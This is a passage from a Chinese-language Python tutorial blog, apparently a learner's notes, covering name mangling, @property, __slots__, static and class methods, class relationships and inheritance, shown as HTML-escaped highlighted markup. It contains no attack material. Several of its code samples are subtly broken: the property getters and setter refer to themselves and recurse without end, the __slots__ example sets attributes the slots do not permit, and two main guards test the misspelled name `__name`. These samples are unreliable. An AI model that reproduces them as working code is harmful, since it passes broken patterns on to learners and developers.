&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; test &lt;span style="color:#f92672"&gt;=&lt;/span&gt; Test(&lt;span style="color:#e6db74"&gt;&amp;#39;hello&amp;#39;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; test&lt;span style="color:#f92672"&gt;.&lt;/span&gt;_Test__bar()
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; print(test&lt;span style="color:#f92672"&gt;.&lt;/span&gt;_Test__foo)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; __name__ &lt;span style="color:#f92672"&gt;==&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;__main__&amp;#34;&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; main()
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;之所以这样设定，可以用这样一句名言加以解释，就是&amp;quot;We are all consenting adults here&amp;quot;。因为绝大多数程序员都认为开放比封闭要好，而且程序员要自己为自己的行为负责。实际开发过程中Python程序员会遵循一种命名习惯就是让属性以单下划线开头表示属性是受保护的，其他类访问这样的属性时应该慎重，这种做法并不是语法上的规则，而是一种隐喻。
作者踩过的坑&lt;a class="link" href="http://blog.csdn.net/jackfrued/article/details/79521404" target="_blank" rel="noopener"
&gt;《Python - 那些年我们踩过的那些坑》&lt;/a&gt;。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;面向对象的支柱&lt;/strong&gt; ：&lt;strong&gt;封装&lt;/strong&gt;、&lt;strong&gt;继承&lt;/strong&gt;、&lt;strong&gt;多态&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;封装的感觉有点像webapi&lt;/p&gt;
&lt;h2 id="面向对象进阶"&gt;面向对象进阶
&lt;/h2&gt;&lt;h3 id="property装饰器"&gt;@property装饰器
&lt;/h3&gt;&lt;p&gt;之前讲过的使用单下划线标识变量为私有的，不建议外界直接访问，如果想访问可以使用 &lt;strong&gt;@property装饰器&lt;/strong&gt; 可以用来包装getter和setter方法&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-python" data-lang="python"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;class&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;Person&lt;/span&gt;(object):
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;def&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;__init__&lt;/span&gt;(self,name,age):
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; self&lt;span style="color:#f92672"&gt;.&lt;/span&gt;name &lt;span style="color:#f92672"&gt;=&lt;/span&gt; name
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; self&lt;span style="color:#f92672"&gt;.&lt;/span&gt;age &lt;span style="color:#f92672"&gt;=&lt;/span&gt; age
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#a6e22e"&gt;@property&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;def&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;name&lt;/span&gt;(self):
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;return&lt;/span&gt; self&lt;span style="color:#f92672"&gt;.&lt;/span&gt;name
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#a6e22e"&gt;@property&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;def&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;age&lt;/span&gt;(self):
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;return&lt;/span&gt; self&lt;span style="color:#f92672"&gt;.&lt;/span&gt;age
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#a6e22e"&gt;@age.setter&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;def&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;age&lt;/span&gt;(self,age):
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; self&lt;span style="color:#f92672"&gt;.&lt;/span&gt;age &lt;span style="color:#f92672"&gt;=&lt;/span&gt; age
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;#没有定义name的setter方法，如果访问的话会报AttributeError: can&amp;#39;t set attribute错误&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id="__-slots-__魔法"&gt;__ slots __魔法
&lt;/h3&gt;&lt;p&gt;由于Python是一种动态语言，允许在程序运行中给对象或属性绑定新的方法和属性，可以使用__slots__魔法来限定类可以绑定的属性和方法。 __slots__是一个变量，英文名直接翻译过来的意思是插槽，可以理解为在其中的方法或属性规定为类可拥有的&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-python" data-lang="python"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;class&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;Person&lt;/span&gt;(object):
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; __slots__ &lt;span style="color:#f92672"&gt;=&lt;/span&gt; (&lt;span style="color:#e6db74"&gt;&amp;#39;_name&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;_age&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;_gender&amp;#39;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;def&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;__init__&lt;/span&gt;(self,name,age):
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; self&lt;span style="color:#f92672"&gt;.&lt;/span&gt;name &lt;span style="color:#f92672"&gt;=&lt;/span&gt; name
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; self&lt;span style="color:#f92672"&gt;.&lt;/span&gt;age &lt;span style="color:#f92672"&gt;=&lt;/span&gt; age
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#a6e22e"&gt;@property&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;def&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;name&lt;/span&gt;(self):
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;return&lt;/span&gt; self&lt;span style="color:#f92672"&gt;.&lt;/span&gt;name
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#a6e22e"&gt;@property&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;def&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;age&lt;/span&gt;(self):
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;return&lt;/span&gt; self&lt;span style="color:#f92672"&gt;.&lt;/span&gt;age
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#a6e22e"&gt;@age.setter&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;def&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;age&lt;/span&gt;(self,age):
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; self&lt;span style="color:#f92672"&gt;.&lt;/span&gt;age &lt;span style="color:#f92672"&gt;=&lt;/span&gt; age
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;#如果添加或设置不在__slots__包含的属性，如&amp;#39;_is_man&amp;#39;则会报错AttributeError: &amp;#39;Person&amp;#39; object has no attribute &amp;#39;_is_man&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id="静态方法和类方法"&gt;静态方法和类方法
&lt;/h3&gt;&lt;p&gt;类中的方法不一定都是对象方法（给类对象传递消息），也有一些通用的&lt;strong&gt;静态方法&lt;/strong&gt;，如：三角形类中还为创建对象之前需要判断三条边是否能组成三角形，判断边能否组成三角形就可以设置为静态方法。&lt;strong&gt;类方法&lt;/strong&gt;个人理解类似于Java中的默认构造方法。
静态方法使用&lt;code&gt;@staticmethod&lt;/code&gt;装饰器，举例：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-python" data-lang="python"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;class&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;Triangle&lt;/span&gt;(object):
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;def&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;__init__&lt;/span&gt;(self, a, b, c):
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; self&lt;span style="color:#f92672"&gt;.&lt;/span&gt;_a &lt;span style="color:#f92672"&gt;=&lt;/span&gt; a
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; self&lt;span style="color:#f92672"&gt;.&lt;/span&gt;_b &lt;span style="color:#f92672"&gt;=&lt;/span&gt; b
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; self&lt;span style="color:#f92672"&gt;.&lt;/span&gt;_c &lt;span style="color:#f92672"&gt;=&lt;/span&gt; c
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#a6e22e"&gt;@staticmethod&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;def&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;is_valid&lt;/span&gt;(a, b, c):
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;return&lt;/span&gt; a &lt;span style="color:#f92672"&gt;+&lt;/span&gt; b &lt;span style="color:#f92672"&gt;&amp;gt;&lt;/span&gt; c &lt;span style="color:#f92672"&gt;and&lt;/span&gt; b &lt;span style="color:#f92672"&gt;+&lt;/span&gt; c &lt;span style="color:#f92672"&gt;&amp;gt;&lt;/span&gt; a &lt;span style="color:#f92672"&gt;and&lt;/span&gt; a &lt;span style="color:#f92672"&gt;+&lt;/span&gt; c &lt;span style="color:#f92672"&gt;&amp;gt;&lt;/span&gt; b
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;def&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;main&lt;/span&gt;():
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#75715e"&gt;#静态方法&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; a,b,c &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#ae81ff"&gt;6&lt;/span&gt;,&lt;span style="color:#ae81ff"&gt;8&lt;/span&gt;,&lt;span style="color:#ae81ff"&gt;10&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; Triangle&lt;span style="color:#f92672"&gt;.&lt;/span&gt;is_valid(a, b, c):
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; print(&lt;span style="color:#e6db74"&gt;&amp;#34;构成三角形&amp;#34;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; __name &lt;span style="color:#f92672"&gt;==&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;__main__&amp;#39;&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; main()
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;类方法使用&lt;code&gt;@classmethod&lt;/code&gt;装饰器，类方法的第一个参数约定名为&lt;code&gt;cls&lt;/code&gt;参数，它代表的是当前类相关的信息的对象，举例：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-python" data-lang="python"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;class&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;Clock&lt;/span&gt;(object):
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;&amp;#34;&amp;#34;数字时钟&amp;#34;&amp;#34;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;def&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;__init__&lt;/span&gt;(self, hour&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;0&lt;/span&gt;, minute&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;0&lt;/span&gt;, second&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;0&lt;/span&gt;):
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; self&lt;span style="color:#f92672"&gt;.&lt;/span&gt;_hour &lt;span style="color:#f92672"&gt;=&lt;/span&gt; hour
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; self&lt;span style="color:#f92672"&gt;.&lt;/span&gt;_minute &lt;span style="color:#f92672"&gt;=&lt;/span&gt; minute
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; self&lt;span style="color:#f92672"&gt;.&lt;/span&gt;_second &lt;span style="color:#f92672"&gt;=&lt;/span&gt; second
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#a6e22e"&gt;@classmethod&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;def&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;now&lt;/span&gt;(cls):
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; ctime &lt;span style="color:#f92672"&gt;=&lt;/span&gt; localtime(time())
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;return&lt;/span&gt; cls(ctime&lt;span style="color:#f92672"&gt;.&lt;/span&gt;tm_hour, ctime&lt;span style="color:#f92672"&gt;.&lt;/span&gt;tm_min, ctime&lt;span style="color:#f92672"&gt;.&lt;/span&gt;tm_sec)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;def&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;show&lt;/span&gt;(self):
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;&amp;#34;&amp;#34;显示时间&amp;#34;&amp;#34;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;return&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;&lt;/span&gt;&lt;span style="color:#e6db74"&gt;%02d&lt;/span&gt;&lt;span style="color:#e6db74"&gt;:&lt;/span&gt;&lt;span style="color:#e6db74"&gt;%02d&lt;/span&gt;&lt;span style="color:#e6db74"&gt;:&lt;/span&gt;&lt;span style="color:#e6db74"&gt;%02d&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#39;&lt;/span&gt; &lt;span style="color:#f92672"&gt;%&lt;/span&gt; \
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; (self&lt;span style="color:#f92672"&gt;.&lt;/span&gt;_hour, self&lt;span style="color:#f92672"&gt;.&lt;/span&gt;_minute, self&lt;span style="color:#f92672"&gt;.&lt;/span&gt;_second)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;def&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;main&lt;/span&gt;():
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; clock &lt;span style="color:#f92672"&gt;=&lt;/span&gt; Clock&lt;span style="color:#f92672"&gt;.&lt;/span&gt;now()
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; clock&lt;span style="color:#f92672"&gt;.&lt;/span&gt;show()
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; __name &lt;span style="color:#f92672"&gt;==&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;__main__&amp;#39;&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; main()
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id="类之间的关系"&gt;类之间的关系
&lt;/h3&gt;&lt;p&gt;类之间的关系主要有三种：is-a、has-a和use-a关系&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;is-a关系。通常称为继承或者泛化，如学生和人的关系，狗和宠物的关系。&lt;/li&gt;
&lt;li&gt;has-a关系。通常称为关联，如部门和公司、汽车和引擎的关系。
&lt;ul&gt;
&lt;li&gt;关联关系如果是整体和部分的关联，则称这种关联为&lt;strong&gt;聚合关系&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;如果整体负责了部分的生命周期（比如我和我的脑子）整体和部分是不可分割的，整体的生命周期结束就表示部分的生命周期结束，这种关联是最强的关联关系，称为&lt;strong&gt;强聚合&lt;/strong&gt;或者&lt;strong&gt;组合关系&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;use-a关系。称为依赖关系，表示一个类依赖于顶一个类的定义，依赖关系总是单向的。比如某人要过河，需要借用一条船，此时人与船之间的关系就是依赖。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;这些都属于UML（统一建模语言）用来描述对象之间的关系。参考内容：&lt;a class="link" href="https://blog.csdn.net/weixin_45920385/article/details/121315813" target="_blank" rel="noopener"
&gt;UML的四种关系&lt;/a&gt;。还可以去看《UML面向对象设计基础》一书&lt;/p&gt;
&lt;h3 id="继承和多态"&gt;继承和多态
&lt;/h3&gt;&lt;p&gt;我们可以在已有的类的基础之上建立新的类，可以直接将原有类中的属性和方法继承下来，从而减少重复代码。继承中有两个概念：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;父类。也成超类、基类，是提供类继承信息的类&lt;/li&gt;
&lt;li&gt;子类。也成派生类、衍生类，是得到继承信息的类&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;子类除了可以继承父类中的属性和方法，还可以定义自己新的属性和方法，所以子类的功能也会更全面。在开发中也经常使用子类替换父类对象，这一规则称为&lt;a class="link" href="https://zh.wikipedia.org/wiki/%E9%87%8C%E6%B0%8F%E6%9B%BF%E6%8D%A2%E5%8E%9F%E5%88%99" target="_blank" rel="noopener"
&gt;里氏替换原则&lt;/a&gt;。
继承的例子：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-python" data-lang="python"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;class&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;Person&lt;/span&gt;(object):
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;def&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;__init__&lt;/span&gt;(self, name, age):
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; self&lt;span style="color:#f92672"&gt;.&lt;/span&gt;_name &lt;span style="color:#f92672"&gt;=&lt;/span&gt; name
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; self&lt;span style="color:#f92672"&gt;.&lt;/span&gt;_age &lt;span style="color:#f92672"&gt;=&lt;/span&gt; age
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;&amp;#34;&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#e6db74"&gt; 省略setter和getter方法
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#e6db74"&gt; &amp;#34;&amp;#34;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;class&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;Student&lt;/span&gt;(Person):
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;def&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;__init__&lt;/span&gt;(self, name, age, grade):
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; super()&lt;span style="color:#f92672"&gt;.&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;__init__&lt;/span&gt;(name, age)&lt;span style="color:#75715e"&gt;#调用父类的初始化方法&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; self&lt;span style="color:#f92672"&gt;.&lt;/span&gt;_grade &lt;span style="color:#f92672"&gt;=&lt;/span&gt; grade
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;子类继承父类方法以后，可以对父类已经实现的方法重新构造，这种行为称为方法重写（override）。通过重写父类的方法，可以使得不同的子类拥有不同的行为，这就是所谓的&lt;strong&gt;多态&lt;/strong&gt;。&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-python" data-lang="python"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;from&lt;/span&gt; abc &lt;span style="color:#f92672"&gt;import&lt;/span&gt; ABCMeta, abstractmethod
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;class&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;Pet&lt;/span&gt;(object, metaclass&lt;span style="color:#f92672"&gt;=&lt;/span&gt;ABCMeta):
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;&amp;#34;&amp;#34;宠物&amp;#34;&amp;#34;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;def&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;__init__&lt;/span&gt;(self, nickname):
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; self&lt;span style="color:#f92672"&gt;.&lt;/span&gt;_nickname &lt;span style="color:#f92672"&gt;=&lt;/span&gt; nickname
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#a6e22e"&gt;@abstractmethod&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;def&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;make_voice&lt;/span&gt;(self):
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;&amp;#34;&amp;#34;发出声音&amp;#34;&amp;#34;&amp;#34;&lt;/span&gt;
